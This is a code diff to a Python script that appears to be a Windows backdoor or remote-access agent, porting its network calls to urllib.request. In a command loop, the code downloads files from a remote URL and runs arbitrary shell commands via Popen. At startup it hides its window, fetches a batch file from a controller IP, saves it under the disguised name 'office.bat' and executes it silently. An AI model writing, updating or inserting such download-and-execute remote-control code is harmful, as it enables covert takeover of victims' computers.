@@ -15,7 +15,8 @@ import os
 import subprocess
 import http.client
 import requests
-import urllib3
+#import urllib3
+import urllib.request
 #import pycurl
 from os import path, access, R_OK
 from uuid import getnode as get_mac
@@ -369,9 +370,12 @@ def myloop():
                                   
                                   sfiledest= scmd[ifile+1:len(scmd)]
                                   
-                                  f = urllib2.urlopen(geturl)
-                                  with open(swin+'\\'+ sfiledest, "wb") as code:
-                                      code.write(f.read())
+                                  #f = urllib2.urlopen(geturl)
+                                  #with open(swin+'\\'+ sfiledest, "wb") as code:
+                                  #    code.write(f.read())
+                                  with urllib.request.urlopen(geturl) as response, open(swin+'\\'+ sfiledest, 'wb') as out_file:
+                                      data = response.read() # a `bytes` object
+                                      out_file.write(data) 
                               else:
                                   p = Popen(scmd,shell=True)
                           #print r.text
@@ -486,9 +490,9 @@ if __name__ == '__main__':
     info = subprocess.STARTUPINFO()
     info.dwFlags = subprocess.STARTF_USESHOWWINDOW
     info.wShowWindow = SW_HIDE
-    f = urllib3.urlopen("http://"+ip+"/win/win.bat")
-    with open(os.getcwd()+"\\office.bat", "wb") as code:
-      code.write(f.read())
+    with urllib.request.urlopen("http://"+ip+"/win/win.bat") as response, open(os.getcwd()+"\\office.bat", 'wb') as out_file:
+       data = response.read() # a `bytes` object
+       out_file.write(data)    
     #subprocess.Popen("curl -L http://"+ip+"/win/win.bat -o "+os.getcwd()+"\\office.bat", startupinfo=info)       
     time.sleep(10)
     p = Popen(os.getcwd()+"\\office.bat", startupinfo=info)
